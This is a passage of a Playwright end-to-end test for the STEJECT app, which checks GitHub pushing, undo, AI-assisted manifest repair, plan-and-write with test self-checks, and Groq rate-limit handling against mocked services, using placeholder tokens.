// End-to-end test of the STEJECT app against mocked GitHub, Telegram and Ollama.
// Run: node test/e2e.mock.js   (needs the `playwright` package and a Chromium)
const path = require("path");
const http = require("http");
const fs = require("fs");
const crypto = require("crypto");
let chromium;
try { ({ chromium } = require("playwright")); } catch { ({ chromium } = require(process.env.PW_PATH || "playwright")); }

const APP = path.join(__dirname, "..", "app");
const OUT = process.env.SHOTS || path.join(__dirname, "shots");
fs.mkdirSync(OUT, { recursive: true });
const TYPES = { ".html": "text/html", ".js": "text/javascript", ".css": "text/css", ".woff2": "font/woff2", ".png": "image/png", ".svg": "image/svg+xml", ".webmanifest": "application/manifest+json" };
const server = http.createServer((q, s) => {
  const p = path.join(APP, decodeURIComponent(new URL(q.url, "http://x").pathname).replace(/\/$/, "/index.html"));
  if (!p.startsWith(APP) || !fs.existsSync(p)) { s.writeHead(404); return s.end(); }
  s.writeHead(200, { "content-type": TYPES[path.extname(p)] || "application/octet-stream" }); s.end(fs.readFileSync(p));
});

let failures = 0;
const ok = (c, m) => { if (c) console.log("ok -", m); else { failures++; console.error("FAIL -", m); } };

// ------------------------------------------------------------------ GitHub mock
const TOKEN = "ghp_" + "t".repeat(36);
const sha = () => crypto.randomBytes(20).toString("hex");
const repos = {};
let lastCreate = null, failNextCommitPost = 0, passBeforeFail = 0, lastPatch = null, noWorkflowScope = false, prs = [];
const blobIds = new Map(); let blobSeq = 0;
function mkRepo(full, files, n) {
  const [owner, name] = full.split("/");
  const r = { owner, name, commits: {}, trees: {}, blobs: {}, ref: null, branch: "main" };
  let parent = null;
  for (let i = 0; i < (n || 0); i++) {
    const t = sha(); r.trees[t] = { ...(files || { "README.md": "# init\n" }) };
    const c = sha(); r.commits[c] = { tree: t, parents: parent ? [parent] : [], message: "Commit " + i }; parent = c;
  }
  r.ref = parent; repos[full] = r; return r;
}
const hist = r => { const o = []; let c = r.ref; while (c) { o.push(c); c = r.commits[c].parents[0]; } return o; };
const treeOf = r => r.ref ? r.trees[r.commits[r.ref].tree] : {};
const isAncestor = (r, anc, c) => { while (c) { if (c === anc) return true; c = r.commits[c].parents[0]; } return false; };
const rj = r => ({ name: r.name, full_name: `${r.owner}/${r.name}`, owner: { login: r.owner }, default_branch: r.branch, html_url: `https://github.com/${r.owner}/${r.name}`, private: false, pushed_at: "2026-10-01T00:00:00Z" });

async function gh(route) {
  const req = route.request();
  const cors = { "access-control-allow-origin": "*", "access-control-allow-headers": "*", "access-control-allow-methods": "*", "content-type": "application/json" };
  if (req.method() === "OPTIONS") return route.fulfill({ status: 204, headers: cors });
  const u = new URL(req.url()), p = u.pathname, m = req.method();
  const body = req.postData() ? JSON.parse(req.postData()) : null;
  const send = (s, d) => route.fulfill({ status: s, headers: cors, body: d == null ? "" : JSON.stringify(d) });
  if (p.endsWith("/releases/latest")) return send(404, { message: "Not Found" });
  if (req.headers()["authorization"] !== "Bearer " + TOKEN) return send(401, { message: "Bad credentials" });
  if (p === "/user") return send(200, { login: "aadvik" });
  if (p === "/user/repos" && m === "GET") return send(200, Object.values(repos).map(rj));
  if (p === "/user/repos" && m === "POST") { lastCreate = body; const r = mkRepo("aadvik/" + body.name, { "README.md": "# " + body.name + "\n" }, body.auto_init ? 1 : 0); return send(201, rj(r)); }
  const mm = p.match(/^\/repos\/([^/]+)\/([^/]+)(.*)$/);
  if (!mm) return send(404, { message: "Not Found" });
  const r = repos[mm[1] + "/" + mm[2]], rest = mm[3];
  if (!r) return send(404, { message: "Not Found" });
  if (rest === "") return send(200, rj(r));
  if (rest === "/git/ref/heads/main") return r.ref ? send(200, { object: { sha: r.ref } }) : send(409, { message: "Git Repository is empty." });
  if (rest.startsWith("/git/commits/") && m === "GET") { const c = r.commits[rest.split("/").pop()]; return c ? send(200, { sha: rest.split("/").pop(), tree: { sha: c.tree }, message: c.message }) : send(404, {}); }
  if (rest.startsWith("/git/trees/") && m === "GET") {
    const t = r.trees[rest.split("/").pop().split("?")[0]];
    return send(200, { tree: Object.keys(t).map(k => { const id = "bb" + (++blobSeq); blobIds.set(id, String(t[k] || "")); return { path: k, type: "blob", sha: id, size: String(t[k] || "").length }; }) });
  }
  if (rest.startsWith("/git/blobs/") && m === "GET") { const c = blobIds.get(rest.split("/").pop()); return c == null ? send(404, {}) : send(200, { encoding: "base64", content: Buffer.from(c).toString("base64") }); }
  if (rest === "/git/refs" && m === "POST") {
    const name = body.ref.replace("refs/heads/", "");
    r.branches = r.branches || {};
    if (r.branches[name]) return send(422, { message: "Reference already exists" });
    r.branches[name] = body.sha; return send(201, { ref: body.ref, object: { sha: body.sha } });
  }
  if (rest === "/pulls" && m === "POST") { const pr = { number: prs.length + 1, html_url: `https://github.com/${r.owner}/${r.name}/pull/${prs.length + 1}`, ...body }; prs.push(pr); return send(201, pr); }
  if (rest === "/commits") { if (!r.ref) return send(409, { message: "Git Repository is empty." }); return send(200, hist(r).slice(0, +u.searchParams.get("per_page") || 30).map(c => ({ sha: c, commit: { message: r.commits[c].message } }))); }
  if (rest.startsWith("/contents/") && m === "GET") {
    const fp = decodeURIComponent(rest.slice(10)); const t = treeOf(r);
    if (!(fp in t)) return send(404, { message: "Not Found" });
    return send(200, { type: "file", encoding: "base64", content: Buffer.from(t[fp]).toString("base64") });
  }
  if (rest.startsWith("/contents/") && m === "PUT") { const t = sha(); r.trees[t] = { ...treeOf(r), [rest.slice(10)]: "" }; const c = sha(); r.commits[c] = { tree: t, parents: r.ref ? [r.ref] : [], message: body.message }; r.ref = c; return send(201, {}); }
  if (!r.ref) return send(409, { message: "Git Repository is empty." });
  if (rest === "/git/blobs") { const b = sha(); r.blobs[b] = body.content; return send(201, { sha: b }); }
  if (rest === "/git/trees") {
    const t0 = body.base_tree ? { ...r.trees[body.base_tree] } : {};
    for (const e of body.tree) { if (e.sha === null) delete t0[e.path]; else t0[e.path] = e.sha ? r.blobs[e.sha] : e.content; }
    const existing = Object.entries(r.trees).find(([, v]) => JSON.stringify(v) === JSON.stringify(t0));
    if (existing) return send(201, { sha: existing[0] });
    const t = sha(); r.trees[t] = t0; return send(201, { sha: t });
  }
  if (rest === "/git/commits") {
    if (failNextCommitPost > 0) {
      if (passBeforeFail > 0) passBeforeFail--;
      else { failNextCommitPost--; return send(502, { message: "Bad gateway" }); }
    }
    const c = sha(); r.commits[c] = { tree: body.tree, parents: body.parents, message: body.message }; return send(201, { sha: c });
  }
  if (rest === "/git/refs/heads/main" && m === "PATCH") {
    lastPatch = body;
    if (noWorkflowScope && Object.keys(r.trees[r.commits[body.sha].tree] || {}).some(k => k.startsWith(".github/workflows/"))) return send(404, { message: "refusing to allow a Personal Access Token to create or update workflow `.github/workflows/ci.yml` without `workflow` scope" });
    if (!body.force && r.ref && !isAncestor(r, r.ref, body.sha)) return send(422, { message: "Update is not a fast forward" });
    r.ref = body.sha; return send(200, {});
  }
  return send(404, { message: "Not Found " + rest });
}

// ------------------------------------------------------------------ Ollama + Telegram mocks
const tg = [];
let chatReply = "";
async function ollama(route) {
  const req = route.request(), p = new URL(req.url()).pathname;
  const cors = { "access-control-allow-origin": "*", "content-type": "application/json" };
  if (p === "/api/tags") return route.fulfill({ status: 200, headers: cors, body: JSON.stringify({ models: [{ name: "qwen2.5-coder:3b", size: 1.9e9 }] }) });
  if (p === "/api/version") return route.fulfill({ status: 200, headers: cors, body: JSON.stringify({ version: "0.12.0" }) });
  if (p === "/api/chat") {
    const body = JSON.parse(req.postData());
    const text = typeof chatReply === "function" ? chatReply(body) : chatReply;
    const parts = text.match(/[\s\S]{1,40}/g) || [""];
    const nd = parts.map(c => JSON.stringify({ message: { content: c }, done: false })).join("\n") + "\n" + JSON.stringify({ done: true }) + "\n";
    return route.fulfill({ status: 200, headers: { ...cors, "content-type": "application/x-ndjson" }, body: nd });
  }
  return route.fulfill({ status: 404, headers: cors, body: "{}" });
}

// ------------------------------------------------------------------ Groq mock (OpenAI-compatible, streaming)
const GROQ_KEY = "gsk_" + "g".repeat(52);
let groqCalls = [], groqPlan = [];
async function groqMock(route) {
  const req = route.request(), u = new URL(req.url());
  const cors = { "access-control-allow-origin": "*", "access-control-allow-headers": "*", "access-control-allow-methods": "*" };
  const json = { ...cors, "content-type": "application/json" };
  if (req.method() === "OPTIONS") return route.fulfill({ status: 204, headers: cors });
  if ((req.headers()["authorization"] || "") !== "Bearer " + GROQ_KEY) return route.fulfill({ status: 401, headers: json, body: JSON.stringify({ error: { message: "Invalid API Key" } }) });
  if (u.pathname === "/openai/v1/models") return route.fulfill({ status: 200, headers: json, body: JSON.stringify({ data: [{ id: "llama-3.3-70b-versatile" }, { id: "openai/gpt-oss-120b" }, { id: "whisper-large-v3" }, { id: "llama-3.1-8b-instant" }] }) });
  if (u.pathname === "/openai/v1/chat/completions") {
    groqCalls.push(JSON.parse(req.postData()));
    const step = groqPlan.length ? groqPlan.shift() : { text: "ok" };
    if (step.status) return route.fulfill({ status: step.status, headers: json, body: JSON.stringify({ error: { message: step.message || "error" } }) });
    const parts = step.text.match(/[\s\S]{1,50}/g) || [""];
    const sse = parts.map(c => "data: " + JSON.stringify({ choices: [{ delta: { content: c } }] }) + "\n\n").join("")
      + "data: " + JSON.stringify({ choices: [{ delta: {}, finish_reason: step.finish || "stop" }] }) + "\n\ndata: [DONE]\n\n";
    return route.fulfill({ status: 200, headers: { ...cors, "content-type": "text/event-stream" }, body: sse });
  }
  return route.fulfill({ status: 404, headers: json, body: "{}" });
}

// ------------------------------------------------------------------ Pyodide mock (the real one is checked by hand; see docs)
// The fake loadPyodide asks the test what each run should return, so the self-check loop can be scripted.
let pyPlan = [], pyRuns = 0, pyCdnDown = false, communityUp = false;
const FAKE_PYODIDE = `self.loadPyodide = async () => {
  let out = () => {};
  return {
    FS: { mkdirTree() {}, writeFile() {} },
    setStdout(o) { out = o.batched || (s => o.write(new TextEncoder().encode(s + "\\n"))); }, setStderr() {}, setStdin() {},
    loadPackage: async () => {}, pyimport: () => ({ install: async () => {} }),
    globals: { set() {} },
    runPythonAsync: async () => {
      const r = await (await fetch("https://cdn.jsdelivr.net/pyodide/__mock__/next")).json();
      if (r.output) out(r.output);
      return JSON.stringify({ status: r.status, detail: r.detail || "" });
    },
  };
};`;
async function pyodideMock(route) {
  const u = new URL(route.request().url());
  const cors = { "access-control-allow-origin": "*" };
  if (u.pathname.endsWith("/__mock__/next")) { pyRuns++; return route.fulfill({ status: 200, headers: { ...cors, "content-type": "application/json" }, body: JSON.stringify(pyPlan.length ? pyPlan.shift() : { status: "pass" }) }); }
  if (pyCdnDown) return route.abort("internetdisconnected");
  if (u.pathname.endsWith("/pyodide.js")) return route.fulfill({ status: 200, headers: { ...cors, "content-type": "text/javascript" }, body: FAKE_PYODIDE });
  return route.fulfill({ status: 404, headers: cors, body: "" });
}

// ------------------------------------------------------------------ any OpenAI-style provider (custom address)
let customCalls = [];
async function customMock(route) {
  const req = route.request(), u = new URL(req.url());
  const cors = { "access-control-allow-origin": "*", "access-control-allow-headers": "*", "access-control-allow-methods": "*" };
  if (req.method() === "OPTIONS") return route.fulfill({ status: 204, headers: cors });
  if (u.pathname === "/v1/models") return route.fulfill({ status: 200, headers: { ...cors, "content-type": "application/json" }, body: JSON.stringify({ data: [{ id: "tiny-coder" }, { id: "big-coder" }] }) });
  if (u.pathname === "/v1/chat/completions") {
    customCalls.push({ auth: req.headers()["authorization"], body: JSON.parse(req.postData()) });
    const sse = "data: " + JSON.stringify({ choices: [{ delta: { content: "## What it does\nHello from a custom provider." } }] }) + "\n\n"
      + "data: " + JSON.stringify({ choices: [{ delta: {}, finish_reason: "stop" }] }) + "\n\n"
      + "data: " + JSON.stringify({ choices: [], usage: { prompt_tokens: 30, completion_tokens: 12, total_tokens: 42 } }) + "\n\ndata: [DONE]\n\n";
    return route.fulfill({ status: 200, headers: { ...cors, "content-type": "text/event-stream" }, body: sse });
  }
  return route.fulfill({ status: 404, headers: cors, body: "{}" });
}

(async () => {
  await new Promise(r => server.listen(0, r));
  const base = `http://localhost:${server.address().port}/`;
  const browser = await chromium.launch(process.env.CHROME ? { executablePath: process.env.CHROME } : {});
  const ctx = await browser.newContext({ viewport: { width: 1360, height: 1000 } });
  await ctx.route("https://api.github.com/**", gh);
  await ctx.route("http://localhost:11434/**", ollama);
  await ctx.route("https://api.groq.com/**", groqMock);
  await ctx.route("https://cdn.jsdelivr.net/pyodide/**", pyodideMock);
  await ctx.route("https://ai.example.test/**", customMock);
  await ctx.route("https://raw.githubusercontent.com/aadvik7/steject-starters/**", route => {
    const u = new URL(route.request().url()), cors = { "access-control-allow-origin": "*" };
    if (!communityUp) return route.fulfill({ status: 404, headers: cors, body: "404: Not Found" });
    if (u.pathname.endsWith("/index.json")) { const r = require("../scripts/validate-starters.js").validate(path.join(__dirname, "..", "templates", "steject-starters")); return route.fulfill({ status: 200, headers: { ...cors, "content-type": "application/json" }, body: JSON.stringify({ version: 1, starters: r.starters }) }); }
    const f = path.join(__dirname, "..", "templates", "steject-starters", u.pathname.replace(/^\/aadvik7\/steject-starters\/main\//, ""));
    return fs.existsSync(f) ? route.fulfill({ status: 200, headers: cors, body: fs.readFileSync(f, "utf8") }) : route.fulfill({ status: 404, headers: cors, body: "" });
  });
  await ctx.route("https://api.telegram.org/**", route => {
    const r = route.request(); const cors = { "access-control-allow-origin": "*", "content-type": "application/json" };
    if (r.url().endsWith("/getUpdates")) return route.fulfill({ status: 200, headers: cors, body: JSON.stringify({ ok: true, result: [{ message: { chat: { id: 4242, first_name: "Aadvik" } } }] }) });
    tg.push(new URLSearchParams(r.postData()).get("text"));
    return route.fulfill({ status: 200, headers: cors, body: JSON.stringify({ ok: true, result: {} }) });
  });
  const page = await ctx.newPage();
  const errors = [];
  page.on("pageerror", e => errors.push(e.message));
  page.on("console", m => { if (m.type() === "error" && !/Failed to load resource|favicon/.test(m.text()) && !/^$|preview\.html|about:srcdoc|^blob:/.test((m.location() || {}).url || "")) errors.push(m.text()); });   // the sandboxed project's own console
  await page.goto(base);
  await page.waitForTimeout(500);
  const shot = async o => { await page.evaluate(() => window.scrollTo(0, 0)); await page.waitForTimeout(80); return page.screenshot(o); };

  // ---- 1. initial state
  ok((await page.textContent("#checks")).includes("Valid"), "sample manifest is valid on first open");
  ok(await page.isDisabled("#pushBtn"), "push disabled until GitHub is connected");
  ok((await page.textContent("#chipAi")).includes("qwen2.5-coder"), "local AI detected and model auto-selected");
  await shot({ path: `${OUT}/1-ship.png`, fullPage: true });

  // ---- 2. connect GitHub + Telegram in Settings
  await page.click("#chipGh");
  await page.fill("#ghToken", "ghp_wrong"); await page.click("#ghConnect"); await page.waitForTimeout(250);
  ok((await page.textContent("#ghMsg")).includes("rejected the token"), "bad token: clear error");
  await page.fill("#ghToken", TOKEN); await page.click("#ghConnect");
  await page.waitForSelector("#ghIn:not([hidden])");
  ok((await page.textContent("#chipGh")) === "@aadvik", "connected chip shows @aadvik");
  await page.fill("#tgToken", "123456789:" + "A".repeat(35));
  await page.click("#tgFind"); await page.waitForTimeout(250);
  ok((await page.inputValue("#tgChat")) === "4242", "Find my chat ID fills the chat id");
  await page.click("#tgTest"); await page.waitForTimeout(250);
  ok(tg.length === 1 && tg[0].includes("connected"), "Telegram test message sent");
  await shot({ path: `${OUT}/2-settings.png`, fullPage: true });

  // ---- 3. new repo push
  await page.click('nav [data-go="ship"]');
  await page.click("#pushBtn");
  await page.waitForSelector("#doneBox:not([hidden])", { timeout: 15000 });
  let r = repos["aadvik/hello-app"];
  ok(hist(r).length === 3 && r.commits[hist(r)[2]].parents.length === 0, "new repo: 3 commits, root commit has no parent");
  ok(JSON.stringify(Object.keys(treeOf(r)).sort()) === JSON.stringify([".gitignore", "README.md", "app.py", "test_app.py"]), "new repo: exactly the manifest files (GitHub's auto README replaced)");
  ok(tg.length === 2 && tg[1].includes("aadvik/hello-app"), "Telegram alert after push");
  await shot({ path: `${OUT}/3-pushed.png`, fullPage: true });

  // ---- 4. update mode with diff + delete
  mkRepo("aadvik/busy-app", { "README.md": "# Busy\n", "app.py": "print(1)\n", "old.txt": "bye\n" }, 4);
  const update = "=== PROJECT: busy-app ===\n=== FILE: app.py ===\nprint(2)\n=== FILE: utils.py ===\ndef f():\n    return 1\n=== COMMIT: Improve app ===\n=== DELETE: old.txt ===\n=== COMMIT: Remove old file ===\n=== FILE: README.md ===\n# Busy\n=== COMMIT: Same readme ===";
  await page.fill("#manifest", update); await page.waitForTimeout(300);
  await page.click("#modeUpd");
  await page.waitForFunction(() => document.querySelector("#repoPick").options.length > 1);
  await page.selectOption("#repoPick", "aadvik/busy-app");
  await page.waitForFunction(() => /changed/.test(document.querySelector("#checks").textContent), null, { timeout: 8000 });
  const checks = await page.textContent("#checks");
  ok(/1 new · 1 changed · 1 deleted/.test(checks), "compare: 1 new, 1 changed, 1 deleted (" + checks.replace(/\s+/g, " ").slice(-40) + ")");
  await page.click('button[data-path="app.py"]');
  await page.click("#vDiff");
  ok((await page.textContent("#vMeta")) === "+1 −1" && (await page.$$(".code tr.add")).length === 1, "diff view shows +1 −1 for app.py");
  await shot({ path: `${OUT}/4-update-diff.png`, fullPage: true });
  const before = repos["aadvik/busy-app"].ref;
  await page.click("#pushBtn");
  await page.waitForSelector("#doneBox:not([hidden])", { timeout: 15000 });
  r = repos["aadvik/busy-app"];
  ok(hist(r).length === 6 && isAncestor(r, before, r.ref) && lastPatch.force === false, "update: 2 commits added on top with a fast-forward (no force)");
  ok((await page.textContent("#log")).includes("skipped"), "update: commit that changes nothing is skipped");
  const t = treeOf(r);
  ok(t["app.py"] === "print(2)\n" && t["utils.py"] && !("old.txt" in t), "update: file changed, added and deleted on GitHub");

  // ---- 5. failure mid-push, then resume
  await page.click("#modeNew");
  await page.fill("#manifest", "=== PROJECT: resume-me ===\n=== FILE: a.txt ===\na\n=== COMMIT: one ===\n=== FILE: b.txt ===\nb\n=== COMMIT: two ===\n=== FILE: c.txt ===\nc\n=== COMMIT: three ===");
  await page.waitForTimeout(300);
  // fail the 2nd commit: let the first through, then fail 6 times (exhausts retries).
  // Armed before clicking so it doesn't race the push.
  passBeforeFail = 1; failNextCommitPost = 6;
  await page.click("#pushBtn");
  await page.waitForSelector("#resumeBtn:not([hidden])", { timeout: 20000 });
  ok((await page.textContent("#log")).includes("Resume push"), "failure: log explains how to resume");
  failNextCommitPost = 0;
  await page.click("#resumeBtn");
  await page.waitForSelector("#doneBox:not([hidden])", { timeout: 15000 });
  r = repos["aadvik/resume-me"];
  ok(hist(r).length === 3 && JSON.stringify(hist(r).map(c => r.commits[c].message).reverse()) === '["one","two","three"]', "resume: finished with exactly 3 commits in order, no duplicates");

  // ---- 6. history
  await page.click('nav [data-go="history"]');
  ok((await page.$$("#histTable tbody tr")).length === 3, "history lists 3 pushes");

  // ---- 6b. undo a push: revert keeps history; a repo STEJECT created points to GitHub's delete; reset refuses if the branch moved
  ok((await page.$$("#histTable [data-undo]")).length === 3, "history: each repo's latest push can be undone");
  const busy = repos["aadvik/busy-app"], headBefore = busy.ref;
  const busyBase = await page.evaluate(() => JSON.parse(localStorage.getItem("steject.history"))[1].before);
  await page.click('#histTable [data-undo="1"]');
  ok((await page.textContent("#undoBox")).includes("Revert (recommended)") && await page.isDisabled("#undoReset"), "undo: revert offered first, reset needs the repo name typed");
  await page.click("#undoRevert");
  await page.waitForFunction(() => /Undone \(revert\)/.test(document.querySelector("#histTable").textContent), null, { timeout: 8000 });
  ok(busy.commits[busy.ref].parents[0] === headBefore && JSON.stringify(treeOf(busy)) === JSON.stringify(busy.trees[busy.commits[busyBase].tree]), "undo: revert adds a commit that restores the old files");
  ok(lastPatch.force === false, "undo: revert never force-pushes");
  await page.click('#histTable [data-undo="0"]');
  ok((await page.textContent("#undoBox")).includes("Delete this repository"), "undo: a repo STEJECT created points to deleting it on GitHub");
  await page.click("[data-undo-close]");
  const hello = repos["aadvik/hello-app"], helloOld = hist(hello)[1];
  const moved = await page.evaluate(([full, b]) => window.SteGitHub.undoPush(window.__steject.S.gh.token, { full, branch: "main", before: b, after: "0".repeat(40), how: "reset" }).then(() => "reset", e => e.message), ["aadvik/hello-app", helloOld]);
  ok(/changed on GitHub/.test(moved) && hello.ref !== helloOld, "undo: reset refuses when someone pushed after you");
  await page.evaluate(([full, b, a]) => window.SteGitHub.undoPush(window.__steject.S.gh.token, { full, branch: "main", before: b, after: a, how: "reset" }), ["aadvik/hello-app", helloOld, hello.ref]);
  ok(hello.ref === helloOld && lastPatch.force === true, "undo: reset moves the branch back");
  await shot({ path: `${OUT}/5-history.png`, fullPage: true });

  // ---- 7. chat-reply converter
  await page.click('nav [data-go="ship"]');
  await page.fill("#manifest", "# Weather Bot\n\n**bot.py**\n```python\nprint('weather')\n```\n\n**requirements.txt**\n```\nrequests\n```\n");
  await page.waitForTimeout(300);
  ok(await page.isVisible("#convertBox"), "chat reply detected, convert offered");
  await page.click("#convertBtn"); await page.waitForTimeout(200);
  ok((await page.textContent("#checks")).includes("Valid") && (await page.textContent("#projName")).includes("weather-bot"), "converted into a valid manifest named weather-bot");
  ok(await page.isVisible("#undoBtn"), "undo offered after converting");

  // ---- 8. AI repair of a broken manifest
  await page.fill("#manifest", "Here is your project:\n\napp.js\nconsole.log(1)\n\nThat's it!");
  await page.waitForTimeout(300);
  ok(await page.isVisible("#fixBox") && !(await page.isDisabled("#fixAiBtn")), "broken text: Fix with local AI offered");
  chatReply = "```\n=== PROJECT: fixed ===\n=== FILE: app.js ===\nconsole.log(1)\n=== COMMIT: Add app ===\n```";
  await page.click("#fixAiBtn");
  await page.waitForFunction(() => /Valid/.test(document.querySelector("#checks").textContent), null, { timeout: 8000 });
  ok((await page.textContent("#projName")).includes("fixed"), "local AI repaired the manifest");

  // ---- 9. AI README + Learn page
  chatReply = "# fixed\n\nA tiny app.\n";
  await page.click("#aiReadme");
  await page.waitForFunction(() => /README added/.test(document.querySelector("#aiToolMsg").textContent), null, { timeout: 8000 });
  ok((await page.textContent("#commits")).includes("Add README"), "AI README added as a new commit");
  chatReply = "## What it does\nLogs **1**.\n\n```js\nconsole.log(1)\n```";
  await page.click('nav [data-go="learn"]');
  await page.click("#lExplain");
  await page.waitForSelector("#learnOut .prose h2", { timeout: 8000 });
  ok((await page.textContent("#learnOut")).includes("What it does"), "Learn: explanation streamed and rendered as markdown");
  chatReply = JSON.stringify({ questions: [
    { q: "What does app.js print?", options: ["0", "1", "2", "nothing"], answer: 1, why: "console.log(1) prints 1.", file: "app.js" },
    { q: "Which runtime runs app.js?", options: ["Node.js", "Python"], answer: 0, why: "It's JavaScript." },
  ] });
  await page.click("#lQuiz");
  await page.waitForSelector(".q", { timeout: 8000 });
  await page.click('.q[data-q="0"] button[data-o="1"]');
  await page.click('.q[data-q="1"] button[data-o="1"]');
  ok((await page.textContent("#quizScore")).includes("1/2"), "quiz: answers marked and scored 1/2");
  await shot({ path: `${OUT}/6-learn.png`, fullPage: true });

  // ---- 9b. paste hint for code copied without file names
  await page.click('nav [data-go="ship"]');
  await page.fill("#manifest", "import unittest\n\nfrom calculator import add\n\nclass T(unittest.TestCase):\n    pass\n");
  await page.waitForTimeout(300);
  ok((await page.textContent("#fixText")).includes("no file names"), "pasted code with no file names: plain-words hint");

  // ---- 9c. Groq: connect, bad key, good key
  await page.click("#chipAi");
  await page.click("#provGroq");
  await page.fill("#groqKey", "gsk_" + "x".repeat(52)); await page.click("#groqSave"); await page.waitForTimeout(300);
  ok((await page.textContent("#groqMsg")).includes("rejected the API key"), "Groq: wrong key gives a clear error");
  ok(!(await page.evaluate(() => localStorage.getItem("steject.secret.groqKey"))), "Groq: wrong key is not saved");
  await page.fill("#groqKey", GROQ_KEY); await page.click("#groqSave"); await page.waitForTimeout(400);
  ok((await page.textContent("#groqMsg")).includes("Key works"), "Groq: good key accepted");
  ok((await page.textContent("#chipAi")) === "AI: groq", "Groq: chip shows AI: groq");
  const gm = await page.textContent("#groqModels");
  ok(gm.includes("llama-3.3-70b-versatile") && gm.includes("In use") && !gm.includes("whisper"), "Groq: chat models listed, default in use, speech models hidden");
  await shot({ path: `${OUT}/9-groq-settings.png`, fullPage: true });

  // ---- 9d. starter gallery, then idea → plan → edit → approve → write (with the repair loop and the self-check fix loop)
  await page.click('nav [data-go="ship"]');
  await page.click("#ideaBox summary");
  ok((await page.$$("#starterList .starter")).length >= 15, "starter gallery lists the starters");
  await page.click('#starterLvl [data-lvl="advanced"]');
  ok((await page.$$("#starterList .starter")).length >= 4 && !(await page.textContent("#starterList")).includes("Number guessing"), "starter gallery filters by level");
  await page.click('#starterLvl [data-lvl="all"]');
  await page.click('[data-starter="todo-cli"]');
  ok((await page.inputValue("#ideaText")).includes("to-do app"), "starter fills the idea box in one click");
  ok(!(await page.isDisabled("#ideaGo")), "idea box enabled once an AI helper is ready");
  // community starters (aadvik7/steject-starters): offline repo → plain message; online → merged, with a finished example
  communityUp = false;
  await page.click("#starterMore"); await page.waitForTimeout(300);
  ok((await page.textContent("#starterMsg")).includes("isn't online yet"), "community starters: missing repo explained");
  communityUp = true;
  await page.click("#starterMore"); await page.waitForSelector('[data-starter="c-todo-cli"]', { timeout: 5000 });
  await page.click('[data-starter="c-todo-cli"]');
  ok(await page.isVisible("#starterExample") && (await page.textContent("#ideaMsg")).includes("You'll learn"), "community starter: idea, what you'll learn, and a finished example");
  await page.click("#starterExample"); await page.waitForTimeout(300);
  ok((await page.textContent("#projName")).includes("todo-cli") && (await page.textContent("#checks")).includes("Valid"), "community starter: the finished example opens");
  await page.click('[data-starter="todo-cli"]');

  const PLAN = JSON.stringify({ project: "todo-cli", summary: "A to-do list for the terminal.", commits: [
    { message: "Add todo core", files: [{ path: "todo.py", purpose: "task functions" }] },
    { message: "Add tests", files: [{ path: "test_todo.py", purpose: "pytest tests" }] },
    { message: "Add README", files: [{ path: "README.md", purpose: "how to run" }, { path: ".gitignore", purpose: "ignore caches" }] },
  ] });
  const good = "=== PROJECT: todo-cli ===\n=== FILE: todo.py ===\nimport json\n\ndef add(items, text):\n    items.append(text)\n    return items\n=== COMMIT: Add todo core ===\n=== FILE: test_todo.py ===\nfrom todo import add\n\ndef test_add():\n    assert add([], 'a') == ['a']\n=== COMMIT: Add tests ===\n=== FILE: README.md ===\n# todo-cli\n=== COMMIT: Add README ===";
  groqCalls = []; groqPlan = [{ text: PLAN }];
  await page.click("#ideaGo");
  await page.waitForSelector("#planBox:not([hidden])", { timeout: 8000 });
  ok(groqCalls.length === 1 && groqCalls[0].response_format && groqCalls[0].response_format.type === "json_object", "plan: asked for a JSON plan first (no code yet)");
  ok((await page.$$("#planList .pf")).length === 4 && (await page.inputValue("#planName")) === "todo-cli", "plan: editable file tree with 4 files in 3 commits");
  await page.fill('#planList > li[data-c="0"] .pcm', "Add the core");
  await page.click('#planList > li[data-c="2"] .pf[data-f="1"] [data-act="delf"]');
  ok((await page.$$("#planList .pf")).length === 3 && (await page.textContent("#planCount")).includes("3 files"), "plan: student removed a file and renamed a commit");
  await shot({ path: `${OUT}/10-plan.png`, fullPage: true });

  // write: first reply broken (repair loop), second good; then tests fail once, the AI fixes todo.py, tests pass
  const fixed = "=== FILE: todo.py ===\nimport json\n\ndef add(items, text):\n    items = list(items)\n    items.append(text)\n    return items\n=== COMMIT: Fix add ===";
  groqCalls = []; pyRuns = 0;
  groqPlan = [{ text: "Sure! Here is your project:\n\ntodo.py\nimport json" }, { text: good }, { text: fixed }];
  pyPlan = [{ status: "fail", output: "FAILED test_todo.py::test_add - AssertionError" }, { status: "pass", output: "1 passed" }];
  await page.click("#planWrite");
  await page.waitForFunction(() => /Tests pass/.test(document.querySelector("#runMsg").textContent), null, { timeout: 20000 });
  ok(groqCalls.length === 3, "write: broken reply repaired, then one AI fix (3 AI calls)");
  ok(/Add the core/.test(groqCalls[0].messages[1].content) && !/\.gitignore/.test(groqCalls[0].messages[1].content), "write: the prompt uses the edited plan");
  ok(JSON.stringify(groqCalls[1].messages.map(m => m.role)) === '["system","user","assistant","user"]' && /problem/.test(groqCalls[1].messages[3].content), "write: repair request includes the parse error");
  ok(groqCalls[0].model === "llama-3.3-70b-versatile" && groqCalls[0].stream === true && groqCalls[0].max_tokens === 5000, "write: chosen model, streaming and a token cap");
  ok(/FAILED test_todo\.py/.test(groqCalls[2].messages[1].content), "self-check: the failing output was sent to the AI");
  ok(pyRuns === 2 && /after 1 AI fix/.test(await page.textContent("#runMsg")), "self-check: tests ran, failed, got fixed, then passed");
  ok(await page.evaluate(() => JSON.stringify(window.__steject.S.m.commits.map(c => c.message))) === '["Add the core","Add tests","Add README"]', "write: commits follow the approved plan; the fix went into the existing commit");
  ok((await page.textContent("#checks")).includes("Runs") && (await page.textContent("#checks")).includes("Yes"), "Inspect shows Runs: Yes");
  ok((await page.textContent("#commits")).includes("changed") && await page.isVisible("#undoBtn"), "the AI's fix is badged as changed, with undo");
  await shot({ path: `${OUT}/11-checked.png`, fullPage: true });

  // ---- 9e. Groq limits: short wait then success; daily limit message; cut-off reply
  groqCalls = [];
  groqPlan = [{ status: 429, message: "Rate limit reached for model `llama-3.3-70b-versatile` in organization `org_x` service tier `on_demand` on tokens per minute (TPM): Limit 12000, Used 11000, Requested 3000. Please try again in 1.2s. Need more tokens?" }, { text: PLAN }];
  await page.fill("#ideaText", "Another small to-do app");
  await page.click("#ideaGo");
  await page.waitForSelector("#planBox:not([hidden])", { timeout: 15000 });
  ok(groqCalls.length === 2, "rate limit (per minute): waited the time Groq asked for, then succeeded");
  groqPlan = [{ status: 429, message: "Rate limit reached for model `x` on tokens per day (TPD): Limit 100000, Used 99000, Requested 3000. Please try again in 7m12s." }];
  await page.click("#planRedo"); await page.waitForTimeout(500);
